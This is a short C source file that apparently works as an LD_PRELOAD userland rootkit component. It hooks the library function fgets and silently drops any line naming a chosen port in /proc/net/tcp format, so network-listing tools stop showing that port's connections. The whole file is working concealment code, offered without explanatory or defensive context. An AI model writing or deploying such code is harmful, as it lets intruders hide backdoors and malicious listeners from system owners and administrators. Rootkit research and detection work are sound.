#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>

char *fgets(char *s, int size, FILE *stream) {
    static char* (*orig)(char*, int, FILE*) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "fgets");

    char *ret = orig(s, size, stream);
    if (ret) {
        // Create the expected hex string format (e.g., ":1F90 ")
        char target[16];
        snprintf(target, sizeof(target), ":%04X ", PORT_TO_HIDE);

        if (strstr(s, target)) {
            return fgets(s, size, stream);
        }
    }
    return ret;
}


